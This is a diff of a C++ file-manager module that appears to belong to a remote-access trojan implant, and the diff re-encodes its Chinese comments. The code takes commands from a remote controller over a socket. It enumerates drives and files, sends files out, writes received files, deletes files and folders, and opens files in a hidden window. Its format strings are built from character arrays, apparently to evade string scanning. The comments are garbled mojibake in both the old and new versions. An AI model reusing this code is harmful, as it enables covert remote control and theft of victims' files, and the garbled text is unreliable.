@@ -1,4 +1,4 @@
-// FileManager.cpp: implementation of the CFileManager class.
+ï»¿// FileManager.cpp: implementation of the CFileManager class.
 //
 //////////////////////////////////////////////////////////////////////
 #include "StdAfx.h"
@@ -8,54 +8,54 @@
 #include <ShlObj.h>
 #include <shellapi.h>
 #include <Shlwapi.h>
-#include "../zlib/zlib.h"  // Ïà¶ÔÓÚServerÄ¿Â¼  // Ïà¶ÔÓÚServerÄ¿Â¼
+#include "../zlib/zlib.h"  // ç›¸å¯¹äºServerç›®å½•  // ç›¸å¯¹äºServerç›®å½•
 #include <vector>  
 
-// ZIPÎÄ¼ş¸ñÊ½½á¹¹¶¨Òå  
+// ZIPæ–‡ä»¶æ ¼å¼ç»“æ„å®šä¹‰  
 #pragma pack(1)  
 struct ZipLocalFileHeader {  
     DWORD signature;        // 0x04034b50  
-    WORD version;           // °æ±¾ĞèÒª  
-    WORD flags;             // Í¨ÓÃ±êÖ¾  
-    WORD compression;       // Ñ¹Ëõ·½·¨  
-    WORD modTime;           // ĞŞ¸ÄÊ±¼ä  
-    WORD modDate;           // ĞŞ¸ÄÈÕÆÚ  
-    DWORD crc32;            // CRC32Ğ£Ñé  
-    DWORD compressedSize;   // Ñ¹Ëõºó´óĞ¡  
-    DWORD uncompressedSize; // Ô­Ê¼´óĞ¡  
-    WORD filenameLength;    // ÎÄ¼şÃû³¤¶È  
-    WORD extraLength;       // À©Õ¹×Ö¶Î³¤¶È  
+    WORD version;           // ç‰ˆæœ¬éœ€è¦  
+    WORD flags;             // é€šç”¨æ ‡å¿—  
+    WORD compression;       // å‹ç¼©æ–¹æ³•  
+    WORD modTime;           // ä¿®æ”¹æ—¶é—´  
+    WORD modDate;           // ä¿®æ”¹æ—¥æœŸ  
+    DWORD crc32;            // CRC32æ ¡éªŒ  
+    DWORD compressedSize;   // å‹ç¼©åå¤§å°  
+    DWORD uncompressedSize; // åŸå§‹å¤§å°  
+    WORD filenameLength;    // æ–‡ä»¶åé•¿åº¦  
+    WORD extraLength;       // æ‰©å±•å­—æ®µé•¿åº¦  
 };  
 
 struct ZipCentralDirEntry {  
     DWORD signature;        // 0x02014b50  
-    WORD versionMade;       // ´´½¨°æ±¾  
-    WORD versionNeeded;     // ĞèÒª°æ±¾  
-    WORD flags;             // Í¨ÓÃ±êÖ¾  
-    WORD compression;       // Ñ¹Ëõ·½·¨  
-    WORD modTime;           // ĞŞ¸ÄÊ±¼ä  
-    WORD modDate;           // ĞŞ¸ÄÈÕÆÚ  
-    DWORD crc32;            // CRC32Ğ£Ñé  
-    DWORD compressedSize;   // Ñ¹Ëõºó´óĞ¡  
-    DWORD uncompressedSize; // Ô­Ê¼´óĞ¡  
-    WORD filenameLength;    // ÎÄ¼şÃû³¤¶È  
-    WORD extraLength;       // À©Õ¹×Ö¶Î³¤¶È  
-    WORD commentLength;     // ×¢ÊÍ³¤¶È  
-    WORD diskNumber;        // ´ÅÅÌºÅ  
-    WORD internalAttr;      // ÄÚ²¿ÊôĞÔ  
-    DWORD externalAttr;     // Íâ²¿ÊôĞÔ  
-    DWORD localHeaderOffset; // ±¾µØÍ·Æ«ÒÆ  
+    WORD versionMade;       // åˆ›å»ºç‰ˆæœ¬  
+    WORD versionNeeded;     // éœ€è¦ç‰ˆæœ¬  
+    WORD flags;             // é€šç”¨æ ‡å¿—  
+    WORD compression;       // å‹ç¼©æ–¹æ³•  
+    WORD modTime;           // ä¿®æ”¹æ—¶é—´  
+    WORD modDate;           // ä¿®æ”¹æ—¥æœŸ  
+    DWORD crc32;            // CRC32æ ¡éªŒ  
+    DWORD compressedSize;   // å‹ç¼©åå¤§å°  
+    DWORD uncompressedSize; // åŸå§‹å¤§å°  
+    WORD filenameLength;    // æ–‡ä»¶åé•¿åº¦  
+    WORD extraLength;       // æ‰©å±•å­—æ®µé•¿åº¦  
+    WORD commentLength;     // æ³¨é‡Šé•¿åº¦  
+    WORD diskNumber;        // ç£ç›˜å·  
+    WORD internalAttr;      // å†…éƒ¨å±æ€§  
+    DWORD externalAttr;     // å¤–éƒ¨å±æ€§  
+    DWORD localHeaderOffset; // æœ¬åœ°å¤´åç§»  
 };  
 
 struct ZipEndOfCentralDir {  
     DWORD signature;        // 0x06054b50  
-    WORD diskNumber;        // ´ÅÅÌºÅ  
-    WORD centralDirDisk;    // ÖĞÑëÄ¿Â¼´ÅÅÌºÅ  
-    WORD entriesOnDisk;     // ±¾´ÅÅÌÌõÄ¿Êı  
-    WORD totalEntries;      // ×ÜÌõÄ¿Êı  
-    DWORD centralDirSize;   // ÖĞÑëÄ¿Â¼´óĞ¡  
-    DWORD centralDirOffset; // ÖĞÑëÄ¿Â¼Æ«ÒÆ  
-    WORD commentLength;     // ×¢ÊÍ³¤¶È  
+    WORD diskNumber;        // ç£ç›˜å·  
+    WORD centralDirDisk;    // ä¸­å¤®ç›®å½•ç£ç›˜å·  
+    WORD entriesOnDisk;     // æœ¬ç£ç›˜æ¡ç›®æ•°  
+    WORD totalEntries;      // æ€»æ¡ç›®æ•°  
+    DWORD centralDirSize;   // ä¸­å¤®ç›®å½•å¤§å°  
+    DWORD centralDirOffset; // ä¸­å¤®ç›®å½•åç§»  
+    WORD commentLength;     // æ³¨é‡Šé•¿åº¦  
 };  
 #pragma pack()
 
@@ -84,7 +84,7 @@ CFileManager::CFileManager(CClientSocket *pClient):CManager(pClient)
 	m_hFileSend = INVALID_HANDLE_VALUE;
 	m_hFileRecv = INVALID_HANDLE_VALUE;
 	m_nTransferMode = TRANSFER_MODE_NORMAL;
-	// ·¢ËÍÇı¶¯Æ÷ÁĞ±í, ¿ªÊ¼½øĞĞÎÄ¼ş¹ÜÀí£¬½¨Á¢ĞÂÏß³Ì
+	// å‘é€é©±åŠ¨å™¨åˆ—è¡¨, å¼€å§‹è¿›è¡Œæ–‡ä»¶ç®¡ç†ï¼Œå»ºç«‹æ–°çº¿ç¨‹
 	SendDriveList();
 }
 
@@ -119,50 +119,50 @@ void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	
 	switch (lpBuffer[0])
 	{
-	case COMMAND_LIST_FILES:			// »ñÈ¡´ÅÅÌÁĞ±í(ÎÄ¼şÁĞ±í)
+	case COMMAND_LIST_FILES:			// è·å–ç£ç›˜åˆ—è¡¨(æ–‡ä»¶åˆ—è¡¨)
 		SendFilesList((char *)lpBuffer + 1);
 		break;
-	case COMMAND_DELETE_FILE:			// ±»¿Ø¶ËÉ¾³ıµ¥¸öÎÄ¼ş
+	case COMMAND_DELETE_FILE:			// è¢«æ§ç«¯åˆ é™¤å•ä¸ªæ–‡ä»¶
 		DeleteFile((char *)lpBuffer + 1);
 		SendToken(TOKEN_DELETE_FINISH);
 		break;
-	case COMMAND_DELETE_DIRECTORY:		// ±»¿Ø¶ËÉ¾³ıÕû¸öÎÄ¼ş¼Ğ
+	case COMMAND_DELETE_DIRECTORY:		// è¢«æ§ç«¯åˆ é™¤æ•´ä¸ªæ–‡ä»¶å¤¹
 		DeleteDirectory((char *)lpBuffer + 1);
 		SendToken(TOKEN_DELETE_FINISH);
 		break;
-	case COMMAND_DOWN_FILES:			// ÉÏ´«ÎÄ¼ş, ¶ÔÓÚ¿ØÖÆ¶ËÀ´ËµÊÇÏÂÔØÎÄ¼ş, ¿ØÖÆ¶Ë½ö´´½¨ÎÄ¼ş(¿ÕÎÄ¼ş)
+	case COMMAND_DOWN_FILES:			// ä¸Šä¼ æ–‡ä»¶, å¯¹äºæ§åˆ¶ç«¯æ¥è¯´æ˜¯ä¸‹è½½æ–‡ä»¶, æ§åˆ¶ç«¯ä»…åˆ›å»ºæ–‡ä»¶(ç©ºæ–‡ä»¶)
 		UploadToRemote(lpBuffer + 1);
 		break;
-	case COMMAND_CONTINUE:				// ÉÏ´«Êı¾İ, ¶ÔÓÚ¿ØÖÆ¶ËÀ´ËµÊÇÏÂÔØÊı¾İ, ¿ØÖÆ¶Ë½«±£´æÊı¾İµ½Ö®Ç°´´½¨µÄ¿ÕÎÄ¼ş
+	case COMMAND_CONTINUE:				// ä¸Šä¼ æ•°æ®, å¯¹äºæ§åˆ¶ç«¯æ¥è¯´æ˜¯ä¸‹è½½æ•°æ®, æ§åˆ¶ç«¯å°†ä¿å­˜æ•°æ®åˆ°ä¹‹å‰åˆ›å»ºçš„ç©ºæ–‡ä»¶
 		SendFileData(lpBuffer + 1);
 		break;
-	case COMMAND_CREATE_FOLDER:			// ±»¿Ø¶Ë´´½¨Ò»¸ö¿ÕµÄÎÄ¼ş¼Ğ
+	case COMMAND_CREATE_FOLDER:			// è¢«æ§ç«¯åˆ›å»ºä¸€ä¸ªç©ºçš„æ–‡ä»¶å¤¹
 		CreateFolder(lpBuffer + 1);
 		break;
-	case COMMAND_RENAME_FILE:			// ±»¿Ø¶ËÖØÃüÃûÎÄ¼ş¼Ğ(ÎÄ¼ş)
+	case COMMAND_RENAME_FILE:			// è¢«æ§ç«¯é‡å‘½åæ–‡ä»¶å¤¹(æ–‡ä»¶)
 		Rename(lpBuffer + 1);
 		break;
-	case COMMAND_STOP:					// ´Ë´¦ÌØÊâ
+	case COMMAND_STOP:					// æ­¤å¤„ç‰¹æ®Š
 		StopTransfer(*&lpBuffer[1]);
 		break;
-	case COMMAND_SET_TRANSFER_MODE:		// ÏÂÔØÎÄ¼ş(¶ÔÓÚ¿ØÖÆ¶ËÀ´ËµÊÇÉÏ´«ÎÄ¼ş)Ê±µÄ´«ÊäÄ£Ê½, °üº¬¸²¸Ç¼Ì´«Ìø¹ıµÈ
+	case COMMAND_SET_TRANSFER_MODE:		// ä¸‹è½½æ–‡ä»¶(å¯¹äºæ§åˆ¶ç«¯æ¥è¯´æ˜¯ä¸Šä¼ æ–‡ä»¶)æ—¶çš„ä¼ è¾“æ¨¡å¼, åŒ…å«è¦†ç›–ç»§ä¼ è·³è¿‡ç­‰
 		SetTransferMode(lpBuffer + 1);
 		break;
-	case COMMAND_FILE_SIZE:				// ÏÂÔØÎÄ¼ş, ¶ÔÓÚ¿ØÖÆ¶ËÀ´ËµÊÇÉÏ´«ÎÄ¼ş, ±»¿Ø¶Ë½ö´´½¨ÎÄ¼ş(¿ÕÎÄ¼ş)
+	case COMMAND_FILE_SIZE:				// ä¸‹è½½æ–‡ä»¶, å¯¹äºæ§åˆ¶ç«¯æ¥è¯´æ˜¯ä¸Šä¼ æ–‡ä»¶, è¢«æ§ç«¯ä»…åˆ›å»ºæ–‡ä»¶(ç©ºæ–‡ä»¶)
 		CreateLocalRecvFile(lpBuffer + 1);
 		break;
-	case COMMAND_FILE_DATA:				// ÏÂÔØÊı¾İ, ¶ÔÓÚ¿ØÖÆ¶ËÀ´ËµÊÇÉÏ´«Êı¾İ, ±»¿Ø¶Ë½«±£´æÊı¾İµ½Ö®Ç°´´½¨µÄ¿ÕÎÄ¼ş
+	case COMMAND_FILE_DATA:				// ä¸‹è½½æ•°æ®, å¯¹äºæ§åˆ¶ç«¯æ¥è¯´æ˜¯ä¸Šä¼ æ•°æ®, è¢«æ§ç«¯å°†ä¿å­˜æ•°æ®åˆ°ä¹‹å‰åˆ›å»ºçš„ç©ºæ–‡ä»¶
 		WriteLocalRecvFile(lpBuffer + 1, nSize - 1);
 		break;
-	case COMMAND_OPEN_FILE_SHOW:		// ±»¿Ø¶ËÒÔ¿É¼û·½Ê½´ò¿ªÖ¸¶¨µÄÎÄ¼ş(Ä¿Â¼)
+	case COMMAND_OPEN_FILE_SHOW:		// è¢«æ§ç«¯ä»¥å¯è§æ–¹å¼æ‰“å¼€æŒ‡å®šçš„æ–‡ä»¶(ç›®å½•)
 		OpenFile1((char *)lpBuffer + 2, !*(lpBuffer + 1), SW_SHOW);
 		//ShellExecute(NULL, "open", (char *)lpBuffer + 1, NULL, NULL, SW_SHOW);
 		break;
-	case COMMAND_OPEN_FILE_HIDE:		// ±»¿Ø¶ËÒÔÒş²Ø·½Ê½´ò¿ªÖ¸¶¨µÄÎÄ¼ş(Ä¿Â¼)
+	case COMMAND_OPEN_FILE_HIDE:		// è¢«æ§ç«¯ä»¥éšè—æ–¹å¼æ‰“å¼€æŒ‡å®šçš„æ–‡ä»¶(ç›®å½•)
 		OpenFile1((char *)lpBuffer + 2, !*(lpBuffer + 1), SW_HIDE);
 		//ShellExecute(NULL, "open", (char *)lpBuffer + 1, NULL, NULL, SW_HIDE);
 		break;
-	case COMMAND_COMPRESS_FILE_PARAM:	// ±»¿Ø¶ËÓÃ(WinRAR)Ñ¹Ëõ»ò½âÑ¹Ö¸¶¨µÄÎÄ¼ş(Ä¿Â¼)
+	case COMMAND_COMPRESS_FILE_PARAM:	// è¢«æ§ç«¯ç”¨(WinRAR)å‹ç¼©æˆ–è§£å‹æŒ‡å®šçš„æ–‡ä»¶(ç›®å½•)
 		ExeCompress(lpBuffer + 1);
 		break;
 	case COMMAND_SEARCH_FILE:
@@ -379,20 +379,20 @@ HANDLE CFileManager::ImpersonateLoggedOnUserWrapper()
 UINT CFileManager::SendDriveList()
 {
 	char	DriveString[256];
-	// Ç°Ò»¸ö×Ö½ÚÎªÁîÅÆ£¬ºóÃæµÄ52×Ö½ÚÎªÇı¶¯Æ÷¸úÏà¹ØÊôĞÔ
+	// å‰ä¸€ä¸ªå­—èŠ‚ä¸ºä»¤ç‰Œï¼Œåé¢çš„52å­—èŠ‚ä¸ºé©±åŠ¨å™¨è·Ÿç›¸å…³å±æ€§
 	BYTE	DriveList[2048];
 	char	FileSystem[MAX_PATH];
 	char	*pDrive = NULL;
 	char	szUserName[UNLEN+1];
 	DWORD	dwUserLen = UNLEN;
-	DriveList[0] = TOKEN_DRIVE_LIST; // Çı¶¯Æ÷ÁĞ±í
+	DriveList[0] = TOKEN_DRIVE_LIST; // é©±åŠ¨å™¨åˆ—è¡¨
 	GetLogicalDriveStrings(sizeof(DriveString), DriveString);
 	pDrive = DriveString;
 	
 	unsigned __int64	HDAmount = 0;
 	unsigned __int64	HDFreeSpace = 0;
-	unsigned long		AmntMB = 0; // ×Ü´óĞ¡
-	unsigned long		FreeMB = 0; // Ê£Óà¿Õ¼ä
+	unsigned long		AmntMB = 0; // æ€»å¤§å°
+	unsigned long		FreeMB = 0; // å‰©ä½™ç©ºé—´
 	
 	GetUserName(szUserName, &dwUserLen);
 	if (stricmp(szUserName, "SYSTEM") == 0)
@@ -409,7 +409,7 @@ UINT CFileManager::SendDriveList()
 	for (DWORD dwOffset = 1 + 1 + lstrlen((char *)&DriveList[2]) + 1; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)
 	{
 		memset(FileSystem, 0, sizeof(FileSystem));
-		// µÃµ½ÎÄ¼şÏµÍ³ĞÅÏ¢¼°´óĞ¡
+		// å¾—åˆ°æ–‡ä»¶ç³»ç»Ÿä¿¡æ¯åŠå¤§å°
 		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
 		SHFILEINFO	sfi;
 		SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
@@ -417,7 +417,7 @@ UINT CFileManager::SendDriveList()
 		int	nTypeNameLen = lstrlen(sfi.szTypeName) + 1;
 		int	nFileSystemLen = lstrlen(FileSystem) + 1;
 		
-		// ¼ÆËã´ÅÅÌ´óĞ¡
+		// è®¡ç®—ç£ç›˜å¤§å°
 		if (pDrive[0] != 'A' && pDrive[0] != 'B' && GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
 		{	
 			AmntMB = HDAmount / 1024 / 1024;
@@ -428,15 +428,15 @@ UINT CFileManager::SendDriveList()
 			AmntMB = 0;
 			FreeMB = 0;
 		}
-		// ¿ªÊ¼¸³Öµ
+		// å¼€å§‹èµ‹å€¼
 		DriveList[dwOffset] = pDrive[0];
 		DriveList[dwOffset + 1] = GetDriveType(pDrive);
 		
-		// ´ÅÅÌ¿Õ¼äÃèÊöÕ¼È¥ÁË8×Ö½Ú
+		// ç£ç›˜ç©ºé—´æè¿°å å»äº†8å­—èŠ‚
 		memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
 		memcpy(DriveList + dwOffset + 6, &FreeMB, sizeof(unsigned long));
 		
-		// ´ÅÅÌ¾í±êÃû¼°´ÅÅÌÀàĞÍ
+		// ç£ç›˜å·æ ‡ååŠç£ç›˜ç±»å‹
 		memcpy(DriveList + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
 		memcpy(DriveList + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);
 		
@@ -448,7 +448,7 @@ UINT CFileManager::SendDriveList()
 
 UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
 {
-	// ÖØÖÃ´«Êä·½Ê½
+	// é‡ç½®ä¼ è¾“æ–¹å¼
 	m_nTransferMode = TRANSFER_MODE_NORMAL;	
 
 	UINT	nRet = 0;
@@ -457,9 +457,9 @@ UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
 	char	*pszFileName = NULL;
 	LPBYTE	lpList = NULL;
 	HANDLE	hFile;
-	DWORD	dwOffset = 0; // Î»ÒÆÖ¸Õë
+	DWORD	dwOffset = 0; // ä½ç§»æŒ‡é’ˆ
 	int		nLen = 0;
-	DWORD	nBufferSize =  1024 * 10; // ÏÈ·ÖÅä10KµÄ»º³åÇø
+	DWORD	nBufferSize =  1024 * 10; // å…ˆåˆ†é…10Kçš„ç¼“å†²åŒº
 	WIN32_FIND_DATA	FindFileData;
 	
 	if (lpszDirectory[lstrlen(lpszDirectory) - 1] != '\\')
@@ -479,16 +479,16 @@ UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
 	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
 	*lpList = TOKEN_FILE_LIST;
 	
-	// 1 ÎªÊı¾İ°üÍ·²¿ËùÕ¼×Ö½Ú,×îºó¸³Öµ
+	// 1 ä¸ºæ•°æ®åŒ…å¤´éƒ¨æ‰€å å­—èŠ‚,æœ€åèµ‹å€¼
 	dwOffset = 1;
 	/*
-	ÎÄ¼şÊôĞÔ	1
-	ÎÄ¼şÃû		strlen(filename) + 1 ('\0')
-	ÎÄ¼ş´óĞ¡	4
+	æ–‡ä»¶å±æ€§	1
+	æ–‡ä»¶å		strlen(filename) + 1 ('\0')
+	æ–‡ä»¶å¤§å°	4
 	*/
 	do 
 	{
-		// ¶¯Ì¬À©Õ¹»º³åÇø
+		// åŠ¨æ€æ‰©å±•ç¼“å†²åŒº
 		if (dwOffset > (nBufferSize - MAX_PATH * 2))
 		{
 			nBufferSize += MAX_PATH * 2;
@@ -497,21 +497,21 @@ UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
 		pszFileName = FindFileData.cFileName;
 		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
 			continue;
-		// ÎÄ¼şÊôĞÔ 1 ×Ö½Ú
+		// æ–‡ä»¶å±æ€§ 1 å­—èŠ‚
 		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
 		dwOffset++;
-		// ÎÄ¼şÃû lstrlen(pszFileName) + 1 ×Ö½Ú
+		// æ–‡ä»¶å lstrlen(pszFileName) + 1 å­—èŠ‚
 		nLen = lstrlen(pszFileName);
 		memcpy(lpList + dwOffset, pszFileName, nLen);
 		dwOffset += nLen;
 		*(lpList + dwOffset) = 0;
 		dwOffset++;
 		
-		// ÎÄ¼ş´óĞ¡ 8 ×Ö½Ú
+		// æ–‡ä»¶å¤§å° 8 å­—èŠ‚
 		memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
 		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
 		dwOffset += 8;
-		// ×îºó·ÃÎÊÊ±¼ä 8 ×Ö½Ú
+		// æœ€åè®¿é—®æ—¶é—´ 8 å­—èŠ‚
 		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
 		dwOffset += 8;
 	} while(FindNextFile(hFile, &FindFileData));
@@ -538,7 +538,7 @@ bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
 	wsprintf(lpszFilter,str18114, lpszDirectory, lpszSlash);
 	
 	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
-	if (hFind == INVALID_HANDLE_VALUE) // Èç¹ûÃ»ÓĞÕÒµ½»ò²éÕÒÊ§°Ü
+	if (hFind == INVALID_HANDLE_VALUE) // å¦‚æœæ²¡æœ‰æ‰¾åˆ°æˆ–æŸ¥æ‰¾å¤±è´¥
 		return false;
 	char str18046[]={'%','s','%','s','%','s','\0'};
 	do
@@ -562,7 +562,7 @@ bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
 		}
 	} while (FindNextFile(hFind, &wfd));
 	
-	FindClose(hFind); // ¹Ø±Õ²éÕÒ¾ä±ú
+	FindClose(hFind); // å…³é—­æŸ¥æ‰¾å¥æŸ„
 	
 	if(!RemoveDirectory(lpszDirectory))
 	{
@@ -576,7 +576,7 @@ UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
 	UINT	nRet = 0;
 	DWORD	dwSizeHigh;
 	DWORD	dwSizeLow;
-	// ±£´æµ±Ç°ÕıÔÚ²Ù×÷µÄÎÄ¼şÃû
+	// ä¿å­˜å½“å‰æ­£åœ¨æ“ä½œçš„æ–‡ä»¶å
 	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
 	strcpy(m_strCurrentProcessFileName, lpszFileName);
 	
@@ -586,8 +586,8 @@ UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
 	if (m_hFileSend == INVALID_HANDLE_VALUE)
 		return FALSE;
 	dwSizeLow =	GetFileSize(m_hFileSend, &dwSizeHigh);
-	//CloseHandle(m_hFileSend); // ´Ë´¦²»Òª¹Ø±Õ, ÒÔºó»¹ÒªÓÃ
-	// ¹¹ÔìÊı¾İ°ü£¬·¢ËÍÎÄ¼ş³¤¶È(1×Ö½Útoken, 8×Ö½Ú´óĞ¡, ÎÄ¼şÃû³Æ, '\0')
+	//CloseHandle(m_hFileSend); // æ­¤å¤„ä¸è¦å…³é—­, ä»¥åè¿˜è¦ç”¨
+	// æ„é€ æ•°æ®åŒ…ï¼Œå‘é€æ–‡ä»¶é•¿åº¦(1å­—èŠ‚token, 8å­—èŠ‚å¤§å°, æ–‡ä»¶åç§°, '\0')
 	int		nPacketSize = lstrlen(lpszFileName) + 10;
 	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
 	memset(bPacket, 0, nPacketSize);
@@ -612,7 +612,7 @@ UINT CFileManager::SendFileData(LPBYTE lpBuffer)
 	pFileSize = (FILESIZE *)lpBuffer;
 	lpFileName = m_strCurrentProcessFileName;
 
-	// Ô¶³ÌÌø¹ı£¬´«ËÍÏÂÒ»¸ö
+	// è¿œç¨‹è·³è¿‡ï¼Œä¼ é€ä¸‹ä¸€ä¸ª
 	if (pFileSize->dwSizeHigh == -1 && pFileSize->dwSizeLow == -1)
 	{
 		UploadNext();
@@ -621,16 +621,16 @@ UINT CFileManager::SendFileData(LPBYTE lpBuffer)
 
 	SetFilePointer(m_hFileSend, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);
 
-	int		nHeadLength = 9; // 1 + 4 + 4Êı¾İ°üÍ·²¿´óĞ¡
+	int		nHeadLength = 9; // 1 + 4 + 4æ•°æ®åŒ…å¤´éƒ¨å¤§å°
 	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
 	DWORD	nNumberOfBytesRead = 0;
 
 	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
-	// Token,  ´óĞ¡£¬Æ«ÒÆ£¬ÎÄ¼şÃû£¬Êı¾İ
+	// Token,  å¤§å°ï¼Œåç§»ï¼Œæ–‡ä»¶åï¼Œæ•°æ®
 	lpPacket[0] = TOKEN_FILE_DATA;
 	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
 	ReadFile(m_hFileSend, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
-	//CloseHandle(m_hFileSend); // ´Ë´¦²»Òª¹Ø±Õ, ÒÔºó»¹ÒªÓÃ
+	//CloseHandle(m_hFileSend); // æ­¤å¤„ä¸è¦å…³é—­, ä»¥åè¿˜è¦ç”¨
 
 	if (nNumberOfBytesRead > 0)
 	{
@@ -647,7 +647,7 @@ UINT CFileManager::SendFileData(LPBYTE lpBuffer)
 	return nRet;
 }
 
-// ´«ËÍÏÂÒ»¸öÎÄ¼ş
+// ä¼ é€ä¸‹ä¸€ä¸ªæ–‡ä»¶
 void CFileManager::UploadNext()
 {
 	if (m_hFileSend != INVALID_HANDLE_VALUE)
@@ -656,16 +656,16 @@ void CFileManager::UploadNext()
 		m_hFileSend = INVALID_HANDLE_VALUE;
 	}
 	list <string>::iterator it = m_UploadList.begin();
-	// É¾³ıÒ»¸öÈÎÎñ
+	// åˆ é™¤ä¸€ä¸ªä»»åŠ¡
 	m_UploadList.erase(it);
-	// »¹ÓĞÉÏ´«ÈÎÎñ
+	// è¿˜æœ‰ä¸Šä¼ ä»»åŠ¡
 	if(m_UploadList.empty())
 	{
 		SendToken(TOKEN_TRANSFER_FINISH);
 	}
 	else
 	{
-		// ÉÏ´«ÏÂÒ»¸ö
+		// ä¸Šä¼ ä¸‹ä¸€ä¸ª
 		it = m_UploadList.begin();
 		SendFileSize((*it).c_str());
 	}
@@ -693,7 +693,7 @@ bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
 	}
 
 	list <string>::iterator it = m_UploadList.begin();
-	// ·¢ËÍµÚÒ»¸öÎÄ¼ş
+	// å‘é€ç¬¬ä¸€ä¸ªæ–‡ä»¶
 	SendFileSize((*it).c_str());
 
 	return true;
@@ -714,7 +714,7 @@ bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
 	wsprintf(lpszFilter,str18114, lpPathName, lpszSlash);
 	
 	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
-	if (hFind == INVALID_HANDLE_VALUE) // Èç¹ûÃ»ÓĞÕÒµ½»ò²éÕÒÊ§°Ü
+	if (hFind == INVALID_HANDLE_VALUE) // å¦‚æœæ²¡æœ‰æ‰¾åˆ°æˆ–æŸ¥æ‰¾å¤±è´¥
 		return false;
 	char str18046[]={'%','s','%','s','%','s','\0'};
 	do
@@ -736,7 +736,7 @@ bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
 		}
 	} while (FindNextFile(hFind, &wfd));
 	
-	FindClose(hFind); // ¹Ø±Õ²éÕÒ¾ä±ú
+	FindClose(hFind); // å…³é—­æŸ¥æ‰¾å¥æŸ„
 	return true;
 }
 
@@ -761,14 +761,14 @@ void CFileManager::StopTransfer(BOOL bIsUpload)
 void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
 {
 	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
-	// ±£´æµ±Ç°ÕıÔÚ²Ù×÷µÄÎÄ¼şÃû
+	// ä¿å­˜å½“å‰æ­£åœ¨æ“ä½œçš„æ–‡ä»¶å
 	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
 	strcpy(m_strCurrentProcessFileName, (char *)lpBuffer + 8);
 	
-	// ±£´æÎÄ¼ş³¤¶È
+	// ä¿å­˜æ–‡ä»¶é•¿åº¦
 	m_nCurrentProcessFileLength = ((__int64)pFileSize->dwSizeHigh << 32) + pFileSize->dwSizeLow;
 	
-	// ´´½¨¶à²ãÄ¿Â¼
+	// åˆ›å»ºå¤šå±‚ç›®å½•
 	MakeSureDirectoryPathExists(m_strCurrentProcessFileName);
 	
 	WIN32_FIND_DATA FindFileData;
@@ -810,33 +810,33 @@ void CFileManager::GetFileData()
 	WIN32_FIND_DATA FindFileData;
 	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
 	
-	//  1×Ö½ÚToken,ËÄ×Ö½ÚÆ«ÒÆ¸ßËÄÎ»£¬ËÄ×Ö½ÚÆ«ÒÆµÍËÄÎ»
+	//  1å­—èŠ‚Token,å››å­—èŠ‚åç§»é«˜å››ä½ï¼Œå››å­—èŠ‚åç§»ä½å››ä½
 	BYTE	bToken[9];
-	DWORD	dwCreationDisposition; // ÎÄ¼ş´ò¿ª·½Ê½ 
+	DWORD	dwCreationDisposition; // æ–‡ä»¶æ‰“å¼€æ–¹å¼ 
 	memset(bToken, 0, sizeof(bToken));
 	bToken[0] = TOKEN_DATA_CONTINUE;
 	
-	// ÎÄ¼şÒÑ¾­´æÔÚ
+	// æ–‡ä»¶å·²ç»å­˜åœ¨
 	if (hFind != INVALID_HANDLE_VALUE)
 	{
-		// ÌáÊ¾µãÊ²Ã´
-		// Èç¹ûÊÇĞø´«
+		// æç¤ºç‚¹ä»€ä¹ˆ
+		// å¦‚æœæ˜¯ç»­ä¼ 
 		if (nTransferMode == TRANSFER_MODE_ADDITION)
 		{
 			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
 			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
 			dwCreationDisposition = OPEN_EXISTING;
 		}
-		// ¸²¸Ç
+		// è¦†ç›–
 		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
 		{
-			// Æ«ÒÆÖÃ0
+			// åç§»ç½®0
 			memset(bToken + 1, 0, 8);
-			// ÖØĞÂ´´½¨
+			// é‡æ–°åˆ›å»º
 			dwCreationDisposition = CREATE_ALWAYS;
 			
 		}
